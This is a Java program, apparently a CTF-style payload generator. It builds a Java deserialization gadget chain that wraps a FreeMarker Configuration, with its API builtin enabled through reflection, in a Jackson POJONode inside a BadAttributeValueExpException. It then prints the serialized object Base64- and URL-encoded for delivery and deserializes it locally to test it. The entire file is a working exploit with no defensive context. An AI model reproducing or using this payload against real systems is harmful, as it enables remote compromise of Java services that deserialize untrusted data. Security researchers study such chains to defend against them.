package com.example.freeemaker;

import com.fasterxml.jackson.databind.node.POJONode;
import freemarker.template.Configuration;
import freemarker.template.Template;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.util.Base64;

public class test3 {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
//        Configuration config = new Configuration();
//        config.setAPIBuiltinEnabled(true);
        Constructor<Configuration> configConstructor = Configuration.class.getDeclaredConstructor();
        configConstructor.setAccessible(true);
        Object config = configConstructor.newInstance();

        // Use reflection to call setAPIBuiltinEnabled method
        Method setAPIBuiltinEnabledMethod = config.getClass().getMethod("setAPIBuiltinEnabled", boolean.class);
        setAPIBuiltinEnabledMethod.invoke(config, true);

//        config.setTemplateLoader(new ClassTemplateLoader(ClassLoader.getSystemClassLoader(), "/templates/"));
//        Template template = config.getTemplate("/index.ftl");

        POJONode node = new POJONode(config);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setValue(val,"val",node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(val);
        objectOutputStream.close();
        byte[] output2 = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
        System.out.println(URLEncoder.encode(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())),"UTF-8"));

//        System.out.println(output);
        byte[] input = Base64.getDecoder().decode(output2);
//
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(input);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}